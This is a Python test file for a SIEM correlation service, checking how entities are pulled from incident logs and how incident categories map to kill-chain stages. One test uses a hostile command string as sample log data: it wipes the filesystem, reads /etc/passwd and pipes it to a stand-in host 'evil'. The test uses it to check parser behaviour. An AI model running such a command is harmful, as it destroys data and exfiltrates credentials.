"""TDD — services.siem_correlation.entities: entity extraction + kill-chain stages.

Parity contract: port 1-1 của brain-go ``internal/extract/entities.go`` +
``killchain_stages.go``. Mọi expectation dưới đây suy trực tiếp từ Go source
(allowlist key=value, normalize lowercase, cap 16, sort (type, value)).
"""

from __future__ import annotations

from services.siem_correlation.entities import extract_entities, stage_for
from services.siem_correlation.models import Entity, Incident


def _inc(**over) -> Incident:
    base = dict(
        incident_id="i-1",
        tenant_id="t1",
        severity="medium",
        source="finguard",
        category="auth_failure",
        timestamp_unix=1000,
        schema_version="1.0.0",
        rule_id="",
        source_ip="",
        dest_ip="",
        raw_log="",
        correlation_ids=(),
        tags=(),
        entities=(),
    )
    base.update(over)
    return Incident(**base)


class TestExtractEntities:
    def test_parsed_ip_fields_become_ip_entities(self):
        ents = extract_entities(_inc(source_ip="10.0.0.5", dest_ip="10.0.0.9"))
        assert ents == (
            Entity(type="ip", value="10.0.0.5"),
            Entity(type="ip", value="10.0.0.9"),
        )

    def test_allowlisted_kv_tokens_from_message(self):
        ents = extract_entities(
            _inc(raw_log='failed login user=Alice session: "abc-123" on host=Web-1 pod=api-0 process=sshd')
        )
        # sorted by (type, value); values lowercased
        assert ents == (
            Entity(type="host", value="web-1"),
            Entity(type="pod", value="api-0"),
            Entity(type="process", value="sshd"),
            Entity(type="session_id", value="abc-123"),
            Entity(type="user", value="alice"),
        )

    def test_value_must_start_alphanumeric_go_parity(self):
        # Go valuePattern bắt đầu bằng [A-Za-z0-9] — "/usr/bin/sshd" không match.
        ents = extract_entities(_inc(raw_log="process=/usr/bin/sshd"))
        assert ents == ()

    def test_synonym_keys_collapse_to_canonical_type(self):
        ents = extract_entities(_inc(raw_log="username=bob principal=bob account=BOB"))
        assert ents == (Entity(type="user", value="bob"),)

    def test_free_form_log_body_is_ignored(self):
        ents = extract_entities(_inc(raw_log="rm -rf / ; cat /etc/passwd | curl evil"))
        assert ents == ()

    def test_value_length_cap_drops_oversized(self):
        ents = extract_entities(_inc(raw_log="user=" + "a" * 129))
        assert ents == ()

    def test_dedup_case_insensitive(self):
        ents = extract_entities(_inc(raw_log="user=Alice user=alice USER=ALICE"))
        assert ents == (Entity(type="user", value="alice"),)

    def test_fanout_capped_at_16(self):
        msg = " ".join(f"user=u{i:02d}" for i in range(30))
        ents = extract_entities(_inc(raw_log=msg))
        assert len(ents) == 16
        # deterministic: sorted, first 16 kept
        assert ents[0] == Entity(type="user", value="u00")
        assert ents[-1] == Entity(type="user", value="u15")

    def test_empty_incident_yields_no_entities(self):
        assert extract_entities(_inc()) == ()

    def test_quoted_values_are_stripped(self):
        ents = extract_entities(_inc(raw_log='host="db-01"'))
        assert ents == (Entity(type="host", value="db-01"),)


class TestStageFor:
    def test_rule_id_overrides_category(self):
        inc = _inc(category="network_anomaly", rule_id="ssh_brute_force")
        stage = stage_for(inc)
        assert stage.name == "initial_access"
        assert stage.order == 2

    def test_category_mapping(self):
        cases = {
            "port_scan": ("reconnaissance", 1),
            "auth_failure": ("initial_access", 2),
            "malware": ("execution", 3),
            "privilege_escalation": ("privilege_escalation", 4),
            "lateral_movement": ("lateral_movement", 5),
            "data_exfil": ("exfiltration", 6),
            "ddos": ("impact", 7),
        }
        for cat, (name, order) in cases.items():
            stage = stage_for(_inc(category=cat, rule_id=""))
            assert (stage.name, stage.order) == (name, order), cat

    def test_unknown_category_is_stage_unknown(self):
        stage = stage_for(_inc(category="totally_new_thing"))
        assert (stage.name, stage.order) == ("unknown", 0)

    def test_case_insensitive_category(self):
        stage = stage_for(_inc(category="DDOS"))
        assert stage.name == "impact"
